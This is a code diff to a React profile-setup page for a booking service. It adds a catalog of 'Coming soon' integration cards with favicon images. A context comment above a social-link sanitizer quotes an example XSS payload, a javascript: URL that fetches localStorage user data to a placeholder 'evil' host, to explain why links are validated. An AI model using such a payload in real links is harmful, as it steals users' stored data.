@@ -38,6 +38,60 @@ const SOCIAL_PLATFORMS = [
   { key: 'email',     label: 'Public Email',placeholder: 'hello@you.com',                   type: 'email' },
 ];
 
+// ─── Integrations catalog ─────────────────────────────────────────────────────
+// Google Calendar is wired (its own card above). These are the rest of the
+// catalog, shown as branded favicon cards (real brand marks via Google's
+// favicon service, no emoji). Marked "Coming soon" until each is wired up.
+const MORE_INTEGRATIONS = [
+  { name: 'Google Meet',          domain: 'meet.google.com',      desc: 'Video links on online bookings' },
+  { name: 'Zoom',                 domain: 'zoom.us',              desc: 'Auto-create Zoom meeting links' },
+  { name: 'Microsoft Teams',      domain: 'teams.microsoft.com',  desc: 'Teams links for bookings' },
+  { name: 'Calendly',             domain: 'calendly.com',         desc: 'Import external availability' },
+  { name: 'Stripe',               domain: 'stripe.com',           desc: 'Accept card payments' },
+  { name: 'Razorpay',             domain: 'razorpay.com',         desc: 'Payments & instant payouts' },
+  { name: 'PayPal',               domain: 'paypal.com',           desc: 'Accept PayPal payments' },
+  { name: 'Cashfree',             domain: 'cashfree.com',         desc: 'Payments & payouts (India)' },
+  { name: 'Zoho CRM',             domain: 'zoho.com',             desc: 'Sync contacts to Zoho CRM' },
+  { name: 'HubSpot',              domain: 'hubspot.com',          desc: 'Push leads to HubSpot' },
+  { name: 'Slack',                domain: 'slack.com',            desc: 'Booking alerts in Slack' },
+  { name: 'Notion',               domain: 'notion.so',            desc: 'Log bookings to Notion' },
+  { name: 'Airtable',             domain: 'airtable.com',         desc: 'Sync bookings to Airtable' },
+  { name: 'WhatsApp Business',    domain: 'whatsapp.com',         desc: 'Reminders via WhatsApp' },
+  { name: 'Mailchimp',            domain: 'mailchimp.com',        desc: 'Add guests to email lists' },
+  { name: 'Brevo',                domain: 'brevo.com',            desc: 'Email & SMS campaigns' },
+  { name: 'Meta Pixel',           domain: 'facebook.com',         desc: 'Track ad conversions' },
+  { name: 'Google Analytics',     domain: 'analytics.google.com', desc: 'Measure your traffic' },
+  { name: 'Google Tag Manager',   domain: 'tagmanager.google.com',desc: 'Manage marketing tags' },
+  { name: 'Google Search Console',domain: 'search.google.com',    desc: 'Track search performance' },
+  { name: 'Zapier',               domain: 'zapier.com',           desc: 'Connect 6,000+ apps' },
+  { name: 'Webhooks',             domain: '',                     desc: 'Send events to your endpoint' },
+];
+
+// Brand favicon with a graceful initial-letter fallback (no emoji).
+const Favicon = ({ domain, name }) => {
+  const [err, setErr] = useState(false);
+  if (err || !domain) {
+    return (
+      <div className="grid h-9 w-9 shrink-0 place-items-center rounded-lg border border-gray-100 bg-gray-50 text-xs font-bold text-gray-400">
+        {name.charAt(0).toUpperCase()}
+      </div>
+    );
+  }
+  return (
+    <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-gray-100 bg-white">
+      <img
+        src={`https://www.google.com/s2/favicons?domain=${domain}&sz=64`}
+        alt=""
+        width="20"
+        height="20"
+        loading="lazy"
+        className="h-5 w-5 object-contain"
+        onError={() => setErr(true)}
+      />
+    </div>
+  );
+};
+
 // ─── Social link sanitizer ───────────────────────────────────────────────────
 // social_links are rendered as href on the public profile/service pages, so an
 // unvalidated value like `javascript:fetch('//evil/?c='+localStorage.user)` is
@@ -556,25 +610,34 @@ const ProfileSetup = () => {
               </FormField>
             </Card>
 
-            {/* Coming soon integrations */}
-            <div className="rounded-2xl border border-dashed bg-gray-50 p-5">
-              <p className="mb-3 text-xs font-semibold uppercase tracking-wide text-gray-400">Coming Soon</p>
-              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
-                {[
-                  { name: 'Zoom', desc: 'Auto-create Zoom meeting links', icon: '🎥' },
-                  { name: 'Notion', desc: 'Log bookings to a Notion database', icon: '📝' },
-                  { name: 'Razorpay Payouts', desc: 'Instant payout scheduling', icon: '💸' },
-                  { name: 'WhatsApp Business', desc: 'Send reminders via WhatsApp', icon: '💬' },
-                ].map(i => (
-                  <div key={i.name} className="flex items-center gap-3 rounded-xl border bg-white p-3 opacity-60">
-                    <span className="text-xl">{i.icon}</span>
-                    <div>
-                      <p className="text-xs font-semibold text-gray-700">{i.name}</p>
-                      <p className="text-[10px] text-gray-400">{i.desc}</p>
+            {/* More integrations — branded favicon cards, expanded catalog */}
+            <div>
+              <div className="mb-3 flex items-center justify-between">
+                <p className="text-xs font-semibold uppercase tracking-wide text-gray-400">More integrations</p>
+                <span className="text-[11px] text-gray-400">{MORE_INTEGRATIONS.length} more</span>
+              </div>
+              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-3">
+                {MORE_INTEGRATIONS.map((i) => (
+                  <div key={i.name} className="flex flex-col rounded-xl border border-gray-100 bg-white p-4 transition-shadow hover:shadow-sm">
+                    <div className="flex items-start gap-3">
+                      <Favicon domain={i.domain} name={i.name} />
+                      <div className="min-w-0 flex-1">
+                        <p className="truncate text-sm font-semibold text-gray-900">{i.name}</p>
+                        <p className="mt-0.5 text-xs leading-snug text-gray-500">{i.desc}</p>
+                      </div>
+                    </div>
+                    <div className="mt-3 flex items-center border-t border-gray-50 pt-2.5">
+                      <span className="inline-flex items-center gap-1 rounded-full bg-gray-100 px-2 py-0.5 text-[10px] font-semibold text-gray-500">
+                        <span className="inline-block h-1.5 w-1.5 rounded-full bg-gray-400" />
+                        Coming soon
+                      </span>
                     </div>
                   </div>
                 ))}
               </div>
+              <p className="mt-3 text-[11px] text-gray-400">
+                More integrations are on the way. Need one sooner? Let us know from the Help page.
+              </p>
             </div>
           </div>
         )}
